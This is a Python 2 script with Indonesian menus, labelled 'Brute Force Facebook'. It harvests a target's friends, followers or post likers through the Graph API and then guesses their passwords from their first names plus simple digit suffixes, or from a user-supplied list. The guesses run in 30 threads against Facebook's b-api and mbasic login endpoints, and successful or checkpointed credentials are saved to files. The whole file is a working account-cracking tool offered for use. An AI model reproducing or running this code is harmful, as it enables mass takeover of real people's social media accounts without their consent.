#!/usr/bin/python2
# coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

reload(sys)
sys.setdefaultencoding('utf8')
useragents = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
              'Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3638.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/197.0.0.46.98;]','Mozilla/5.0 (Linux; Android 10; RMX1821 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 GSA/12.22.8.23.arm64')
ua = 'Mozilla/5.0 (Linux; Android 10; RMX1821 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 GSA/12.22.8.23.arm64'

ng = requests.get('https://squirming-claim.000webhostapp.com/country/?').text
kt = requests.get('https://squirming-claim.000webhostapp.com/region/?').text
key = requests.get('https://raw.githubusercontent.com/avsid/ambf/main/license.php').text
ip = requests.get('https://api.ipify.org').text
logo="""    \x1b[1;95m
 _________________________________ 
|  \x1b[1;91m____  ____  _   _ _____ _____\x1b[1;95m  |
| \x1b[1;91m| __ )|  _ \| | | |_   _| ____| \x1b[1;95m|\x1b[1;97mAu\x1b[1;91m: \x1b[1;97mRomi & Azmi\x1b[1;95m
|\x1b[1;91m |  _ \| |_) | | | | | | |  _|   \x1b[1;95m|\x1b[1;97mversion \x1b[1;97m1\x1b[1;91m.\x1b[1;97m0\x1b[1;95m
| \x1b[1;97m| |_) |  _ <| |_| | | | | |___  \x1b[1;95m|\x1b[1;97mfb.me/romi.29.04.03\x1b[1;95m
| \x1b[1;97m|____/|_| \_\\\___/  |_| |_____| \x1b[1;95m|\x1b[1;97mfb.me/ade.eby.3\x1b[1;95m
|_________________________________|
 \x1b[1;91m     ● \x1b[1;93mBrute Force Facebook \x1b[91m●\x1b[1;97m
  """
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))

def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        token = raw_input('\n[+] Your Token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            print(('\x1b[92m[•] Login Sukses!\x1b[0m'))
            #print '[\xe2\x80\xa2] Add Dulu Cok fb Saya'
            raw_input('[>] Tekan Enter ')
            os.system('xdg-open https://www.facebook.com/romi.29.04.03')
            menu()
        except KeyError:
            print ' [!] Token Invalid'
            sys.exit()
            
            
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
  #  print"┌════════════════════════════════════════┐"
    print"[+] Welcome   :"    + nama
    print"[+] IP kau    :"  +ip 
    print"[+] Beragbung :" +durasi
    #print"└════════════════════════════════════════┘"
    print"[1] Crack Dengan b-api (Fast Crack)"
    print"[2] Crack Dengan mbasic (Slow Crack)"
    print"[0] Logout (hapus token)"
    method = raw_input('\n[?] Choose : ')
    if method == '':
        menu()
    elif method == '1' or method == '01':
        menubapi()
    elif method == '2' or method == '02':
        menumbasic()
    elif method == '0' or method == '00':
        os.system('rm -f login.txt')
        print'[!] Berhasil Menghapus Token'
        exit()
    else:
        exit('[!] Pilih Yang Bener')
        
        
def menubapi():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
    #print"┌════════════════════════════════════════┐"
    print"[+] Welcome   :"    + nama
    print"[+] IP Kau    :"  +ip 
    print"[+] Beragbung :" +durasi
    #print"└════════════════════════════════════════┘"
    #print"[*] Method     : b-api\n"
    print"[1] Crack Dari Publik Teman"
    print"[2] Crack Dari Total Followers"
    print"[3] Crack Dari Like Postingan"
    print"[4] Lihat Hasil Crack"
    print"[0] Logout (hapus token)"
    pilih_menubapi()


def pilih_menubapi():
    ask = raw_input('\n[?] Choose : ')
    if ask == '':
        print '[!] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print "\n[*] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n[*] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '\n[*] Mikan ID Postingan'
        idt = raw_input('[+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print '\n[1] Hasil OK '
        print '[2] Hasil CP '
        ress = raw_input('\n[?] Choose : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            os.system('echo -e "\033[0;97m┌════════════════════════════════════════┐"| lolcat')
            print '\n[+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('echo -e "\033[0;97m└════════════════════════════════════════┘"| lolcat')
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            os.system('echo -e "\033[0;97m┌════════════════════════════════════════┐"| lolcat')
            print '[+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('echo -e "\033[0;97m└════════════════════════════════════════┘"| lolcat')
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('[!] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print '[!] Berhasil Menghapus Token'
        exit()
    else:
        print '[!] Pilih Yang Bener !'
        exit()
    ask = raw_input('[?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualbapi()
    print '[*] Total ID : ' + str(len(id))
    #print '[+] File Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    #print '[+] File Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print"[!] Sedang Prosess Crack\n"

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s  '% (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower()]:
                ua_api = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_api)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\x1b[0;92m[OKEH] ' + uid + '|' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OKEH] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r\x1b[0;93m[CEPEH] ' + uid + '|' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CEPEH] ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n[+] Finished'
    exit()


def manualbapi():
    print'\n[*] Masukan Password Contoh : sayang,rahasia,123456'
    pw = raw_input('[?] Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Bener, Tidak Boleh Kosong')
    print '[*] Total ID : ' + str(len(id))
    #print '[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    #print '[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print '[!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\x1b[0;92m[OKEH] ' + uid + '|' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OKEH] ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r\x1b[0;93m[CEPEH]' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CEPEH] ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n[+] Finished'
    exit()
    
    
def menumbasic():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo
    print" "
    print"[+] Welcome   :"    + nama
    print"[+] IP kau    :"  +ip 
    print"[+] Bergabung :" +durasi
    print" "
    #print"[*] Method     : mbasic\n"
    print"[1] Crack Dari Publik Teman"
    print"[2] Crack Dari Total Followers"
    print"[3] Crack Dari Like Postingan"
    print"[4] Lihat Hasil Crack"
    print"[0] Logout (hapus token)"
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n[?] Choose : ')
    if ask == '':
        print'[!] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print "\n[*] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print'[+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n[*] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input(' [+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print'[+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '\n[*] Masukan ID Postingan'
        idt = raw_input('[+] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print'\n[1] Hasil OK '
        print'[2] Hasil CP '
        ress = raw_input('\n [?] Choose : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            print '\n [#] ------------------------------------------------'
            print '\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            print '\n [#] ------------------------------------------------'
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit(' [!] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print ' [!] Berhasil Menghapus Token'
        exit()
    else:
        print ' [!] Pilih Yang Bener !'
        exit()
    ask = raw_input('[?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()
    print'[*] Total ID : ' + str(len(id))
    #print'[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    #print'[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print'[!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345', name.lower()]:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m[OKEH] ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OKEH] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r\x1b[0;93m[CEPEH] ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CEPEH] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Finished'
    exit()


def manualmbasic():
    print'\n[*] Masukan Password Contoh : sayang,rahasia'
    pw = raw_input('[?] Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Bener, Tidak Boleh Kosong')
    print'[*] Total ID : ' + str(len(id))
    #print'[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    #print'[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print'[!] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print'\r\x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m[OKEH] ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OKEH] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[0;93m[CEPEH] ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CEPEH] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Finished'
    exit()
    
    


if __name__ == '__main__':
    os.system('clear')
    print logo
    print '     [#] Sebentar Lagi Update...'
    os.system('git pull')
    tokenz()


